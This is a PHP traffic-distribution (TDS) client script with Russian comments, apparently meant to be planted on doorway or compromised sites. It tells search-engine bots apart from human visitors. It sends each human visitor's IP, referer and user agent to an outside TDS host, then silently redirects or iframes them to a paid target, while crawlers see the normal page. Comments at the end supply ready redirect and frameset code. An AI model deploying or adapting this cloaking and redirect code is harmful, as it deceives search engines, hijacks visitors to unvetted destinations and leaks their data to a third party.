<?php
@ini_set('display_errors', 0);
@error_reporting(0);
$z_id = 'dwl';//ID группы
$z_key_api_host = 'LmRe4q';//API ключ
$z_url = 'http://tds.com/?api=';//ссылка на TDS (замените только домен)
$z_cf_ip = 0;//определять IP посетителя по $_SERVER["HTTP_CF_CONNECTING_IP"] (0/1)
$z_em_referer = 0;//если пустой реферер - это бот (0/1)
$z_em_useragent = 1;//если пустой юзерагент - это бот (0/1)
$z_em_lang = 1;//если пустой язык браузера - это бот (0/1)
$z_ipv6 = 1;//если IP адрес IPV6 - это бот (0/1)
$z_ptr = 0;//проверять PTR запись (0/1)
$z_rd_bots = 0;//запрашивать с TDS данные для ботов (0/1)
$z_rd_se = 0;//запрашивать с TDS данные только для поситетелей из ПС (0/1)
$z_rotator = 1;//включить ротатор и разрешить установку cookies (0/1)
$z_n_cookies = 'md5(host)';//название cookies для посетителей
$z_t_cookies = 3600;//время жизни cookies в секундах
$z_m_cookies = 0;//считать Expires от LastAccessed или от CreationTime (0/1)
$z_connect = 1;//тип соединения с TDS, file_get_contents или curl (0/1)
$z_timeout = 10;//таймаут соединения в секундах (только для curl)
$z_ip_serv_seodor = '';//IP серверной части SEoDOR
$z_sign_ref = htmlentities('iframe-toloka.com,hghltd.yandex.net', ENT_QUOTES, 'UTF-8');//признаки ботов в реферере
$z_sign_ua = htmlentities('ahrefs,aport,ask,bot,btwebclient,butterfly,commentreader,copier,crawler,crowsnest,curl,disco,ezooms,fairshare,httrack,ia_archiver,internetseer,java,js-kit,larbin,libwww,linguee,linkexchanger,lwp-trivial,netvampire,nigma,ning,nutch,offline,peerindex,postrank,rambler,semrush,slurp,soup,spider,sweb,teleport,twiceler,voyager,wget,wordpress,yeti,zeus', ENT_QUOTES, 'UTF-8');//признаки ботов в юзерагенте
$z_status = 1;//включить слив (0/1)
/*Ниже ничего не изменяйте*/
if($z_status == 1){
	$z_out = '';
	$z_lang = '';
	$z_country = '';
	$z_city = '';
	$z_region = '';
	$z_device = '';
	$z_operator = '';
	$z_uniq = '';
	$z_macros = '';
	$z_empty = '-';
	$z_bot = $z_empty;
	$z_useragent = $z_empty;
	if(!empty($_SERVER['HTTP_USER_AGENT'])){
		$z_useragent = $_SERVER['HTTP_USER_AGENT'];
	}
	elseif($z_em_useragent == 1){
		$z_bot = 'empty_ua';
	}
	$z_referer = $z_empty;
	$z_se = $z_empty;
	if(!empty($_SERVER['HTTP_REFERER'])){
		$z_referer  = $_SERVER['HTTP_REFERER'];
		if(stristr($z_referer, 'google')){$z_se = 'google';}
		if(stristr($z_referer, 'yandex')){$z_se = 'yandex';}
		if(stristr($z_referer, 'mail.ru')){$z_se = 'mail';}
		if(stristr($z_referer, 'yahoo')){$z_se = 'yahoo';}
		if(stristr($z_referer, 'bing')){$z_se = 'bing';}
	}
	elseif($z_bot == $z_empty && $z_em_referer == 1){
		$z_bot = 'empty_ref';
	}
	if($z_bot == $z_empty && $z_referer != $z_empty && !empty($z_sign_ref)){
		$z_ex = explode(",", $z_sign_ref);
		foreach($z_ex as $z_value){
			$z_value = trim(html_entity_decode($z_value, ENT_QUOTES, 'UTF-8'));
			if(stristr($z_referer, $z_value)){
				$z_bot = 'sign_ref';
				break;
			}
		}
	}
	if(stristr($z_useragent, 'baidu')){$z_bot = 'baidu';}
	if(stristr($z_useragent, 'bing') || stristr($z_useragent, 'msnbot')){$z_bot = 'bing';}
	if(stristr($z_useragent, 'google')){$z_bot = 'google';}
	if(stristr($z_useragent, 'mail.ru')){$z_bot = 'mail';}
	if(stristr($z_useragent, 'yahoo')){$z_bot = 'yahoo';}
	if(stristr($z_useragent, 'yandex.com/bots')){$z_bot = 'yandex';}
	if($z_bot == $z_empty && $z_useragent != $z_empty && !empty($z_sign_ua)){
		$z_ex = explode(",", $z_sign_ua);
		foreach($z_ex as $z_value){
			$z_value = trim(html_entity_decode($z_value, ENT_QUOTES, 'UTF-8'));
			if(stristr($z_useragent, $z_value)){
				$z_bot = 'sign_ua';
				break;
			}
		}
	}
	$z_cf_country = $z_empty;
	if(!empty($_SERVER["HTTP_CF_IPCOUNTRY"])){
		$z_cf_country = strtolower($_SERVER["HTTP_CF_IPCOUNTRY"]);
	}
	if($z_cf_ip == 1 && !empty($_SERVER["HTTP_CF_CONNECTING_IP"])){
		$z_ipuser = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	if($z_cf_ip == 0 || empty($z_ipuser)){
		if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
			if(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ".") > 0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ",") > 0){
				$z_ip = explode(",", $_SERVER['HTTP_X_FORWARDED_FOR']);
				$z_ipuser = trim($z_ip[0]);
			}
			elseif(strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ".") > 0 && strpos($_SERVER['HTTP_X_FORWARDED_FOR'], ",") === false){
				if(empty($z_ip_serv_seodor)){
					$z_ipuser = trim($_SERVER['HTTP_X_FORWARDED_FOR']);
				}
			}
		}
		if(empty($z_ipuser)){
			$z_ipuser = trim($_SERVER['REMOTE_ADDR']);
		}
	}
	if(!filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
		$z_ipuser = $z_empty;
	}
	if($z_bot == $z_empty && $z_ipv6 == 1 && filter_var($z_ipuser, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6)){
		$z_bot = 'ipv6';
	}
	if($z_bot == $z_empty && $z_ptr == 1){
		$z_ptr_rec = gethostbyaddr($z_ipuser);
		if(stristr($z_ptr_rec, 'baidu')){$z_bot = 'baidu';}
		if(stristr($z_ptr_rec, 'bing') || stristr($z_ptr_rec, 'msnbot')){$z_bot = 'bing';}
		if(stristr($z_ptr_rec, 'google')){$z_bot = 'google';}
		if(stristr($z_ptr_rec, 'mail.ru')){$z_bot = 'mail';}
		if(stristr($z_ptr_rec, 'yahoo')){$z_bot = 'yahoo';}
		if(stristr($z_ptr_rec, 'yandex')){$z_bot = 'yandex';}
	}
	$z_lang = $z_empty;
	if(!empty($_SERVER['HTTP_ACCEPT_LANGUAGE'])){
		$z_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
	}
	if($z_lang == $z_empty && $z_em_lang == 1){
		$z_bot = 'empty_lang';
	}
	$z_domain = $_SERVER['HTTP_HOST'];
	$z_page = $_SERVER['REQUEST_URI'];
	$z_page_url = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	if(($z_bot == $z_empty || $z_rd_bots == 1) && $z_ipuser != $z_empty){
		$z_uniq = 'yes';
		if($z_rotator == 1){
			if($z_n_cookies == 'md5(host)'){
				$z_n_cookies = md5($z_domain);
			}
			$z_t_cookies = time() + $z_t_cookies;
			$z_n_cookies_exp = md5($z_domain.'_exp');
			if(!isset($_COOKIE[$z_n_cookies])){
				SetCookie($z_n_cookies, 0, $z_t_cookies, '/');
				$z_counter = 0;
				$z_uniq = 'yes';
				if($z_m_cookies == 1){
					SetCookie($z_n_cookies_exp, $z_t_cookies, $z_t_cookies, '/');
				}
			}
			else{
				$z_counter = $_COOKIE[$z_n_cookies] + 1;
				if($z_m_cookies == 0){
					SetCookie($z_n_cookies, $z_counter, $z_t_cookies, '/');
				}
				if($z_m_cookies == 1){
					if(isset($_COOKIE[$z_n_cookies_exp])){
						$z_t_cookies = $_COOKIE[$z_n_cookies_exp];
					}
					SetCookie($z_n_cookies, $z_counter, $z_t_cookies, '/');
				}
				$z_uniq = 'no';
			}
		}
		if(empty($z_key)){$z_key = '';}
		if(empty($z_parameter_1)){$z_parameter_1 = '';}
		if(empty($z_parameter_2)){$z_parameter_2 = '';}
		if(empty($z_parameter_3)){$z_parameter_3 = '';}
		if(empty($z_parameter_4)){$z_parameter_4 = '';}
		if(empty($z_parameter_5)){$z_parameter_5 = '';}
		$z_request = array();
		$z_request['key_api'] = $z_key_api_host;
		$z_request['id'] = $z_id;
		$z_request['ip'] = $z_ipuser;
		$z_request['referer'] = $z_referer;
		$z_request['useragent'] = $z_useragent;
		$z_request['se'] = $z_se;
		$z_request['lang'] = $z_lang;
		$z_request['uniq'] = $z_uniq;
		$z_request['key'] = urlencode($z_key);
		$z_request['domain'] = $z_domain;
		$z_request['page'] = $z_page;
		$z_request['cf_country'] = $z_cf_country;
		$z_request['par_1'] = urlencode($z_parameter_1);
		$z_request['par_2'] = urlencode($z_parameter_2);
		$z_request['par_3'] = urlencode($z_parameter_3);
		$z_request['par_4'] = urlencode($z_parameter_4);
		$z_request['par_5'] = urlencode($z_parameter_5);
		$z_request = $z_url.base64_encode(serialize($z_request));
		if((empty($z_ip_serv_seodor) || $z_ipuser != $z_ip_serv_seodor) && ($z_rd_se == 0 || ($z_rd_se == 1 && $z_se != $z_empty))){
			if($z_connect == 0){
				$z_response = @file_get_contents($z_request);
			}
			else{
				$z_ch = curl_init();
				curl_setopt($z_ch, CURLOPT_TIMEOUT, $z_timeout);
				curl_setopt($z_ch, CURLOPT_URL, $z_request);
				curl_setopt($z_ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($z_ch, CURLOPT_FOLLOWLOCATION, 1);
				$z_response = curl_exec($z_ch);
				curl_close($z_ch);
			}
			$z_response = @unserialize($z_response);
			if(is_array($z_response)){
				$z_out = trim(html_entity_decode($z_response[0], ENT_QUOTES, 'UTF-8'));
				$z_redirect = $z_response[1];
				if($z_redirect == 0){
					$z_country = $z_response[2];
					$z_region = $z_response[3];
					$z_city = $z_response[4];
					$z_device = $z_response[5];
					$z_operator = $z_response[6];
					$z_bot = $z_response[7];
					$z_uniq = $z_response[8];
					$z_lang = $z_response[9];
					$z_macros = trim(html_entity_decode($z_response[10], ENT_QUOTES, 'UTF-8'));
				}
				if(stristr($z_out, '|||') && $z_rotator == 1){
					$z_out_ex = explode('|||', $z_out);
					if(isset($z_out_ex[$z_counter])){
						$z_test = trim($z_out_ex[$z_counter]);
					}
					if(!empty($z_test)){
						$z_out = trim($z_out_ex[$z_counter]);
					}
					else{
						$z_out = trim($z_out_ex[0]);
						SetCookie($z_n_cookies, 0, time() + $z_t_cookies, '/');
						$z_counter = 0;
					}
				}
				else{
					if(stristr($z_out, '|||')){
						$z_out_ex = explode('|||', $z_out);
						$z_out = trim($z_out_ex[0]);
					}
				}
				if(stristr($z_out, '[RAWURLENCODE_REFERER]')){
					$z_out = str_ireplace('[RAWURLENCODE_REFERER]', rawurlencode($z_referer), $z_out);
				}
				if(stristr($z_out, '[URLENCODE_REFERER]')){
					$z_out = str_ireplace('[URLENCODE_REFERER]', urlencode($z_referer), $z_out);
				}
				if(stristr($z_out, '[RAWURLENCODE_PAGE_URL]')){
					$z_out = str_ireplace('[RAWURLENCODE_PAGE_URL]', rawurlencode($z_page_url), $z_out);
				}
				if(stristr($z_out, '[URLENCODE_PAGE_URL]')){
					$z_out = str_ireplace('[URLENCODE_PAGE_URL]', urlencode($z_page_url), $z_out);
				}
				/* Здесь можно прописать нужный вам код (см. ниже) */
			}
		}
	}
}
/*
Если ротатор выключен, аутом будет первый URL, уникальность "по cookies" работать не будет
Переменные  | возможные данные
------------------------------
$z_out      | ссылка на платник/код или пусто
$z_lang     | язык браузера или $z_empty
$z_country  | код страны или $z_empty
$z_city     | город или $z_empty
$z_region   | код региона или $z_empty
$z_device   | computer, tablet, phone
$z_operator | beeline, megafon, mts, tele2, azerbaijan, belarus, kazakhstan, ukraine, wap-1, wap-2, wap-3 или $z_empty
$z_bot      | baidu, bing, google ,mail, yahoo, yandex ... или $z_empty
$z_uniq     | yes, no
$z_macros   | результат обработки макросов или пусто
*/
/*
В некоторых случаях можно прописывать код редиректа или фрейма внутри api.php
Примеры кода:
1. Редирект WAP трафика
if($z_operator != $z_empty && $z_bot == $z_empty && !empty($z_out)){header("Location: $z_out");}
2. Сгенерировать и показать страницу с фреймом, для всех кроме ботов
if($z_bot == $z_empty && !empty($z_out)){echo '<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title>'.$_SERVER['HTTP_HOST'].'</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="robots" content="noindex, nofollow"></head><frameset rows="100%,*" border="0" frameborder="0" framespacing="0" framecolor="#000000" scrolling="no"><frame src="'.$z_out.'"></frameset></html>';exit();}
3. Управление типом слива из админки TDS
if($z_bot == $z_empty && !empty($z_out) && stristr($z_out, ';')){
	$z_ex = explode(";", $z_out);
	$z_type = trim($z_ex[0]);
	$z_link = trim($z_ex[1]);
	if($z_type == 'redirect'){header("Location: $z_link");exit();}
	if($z_type == 'iframe'){echo '<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title>'.$_SERVER['HTTP_HOST'].'</title><meta http-equiv="content-type" content="text/html;charset=utf-8"><meta name="robots" content="noindex, nofollow"></head><frameset rows="100%,*" border="0" frameborder="0" framespacing="0" framecolor="#000000" scrolling="no"><frame src="'.$z_link.'"></frameset></html>';exit();}
}
Для редиректа пропишите в ауте: redirect;http://platnik.ru
Для фрейма: iframe;http://platnik.ru
*/
/*
?> последняя строка в этом файле, после нее не должно быть ничего
*/
?>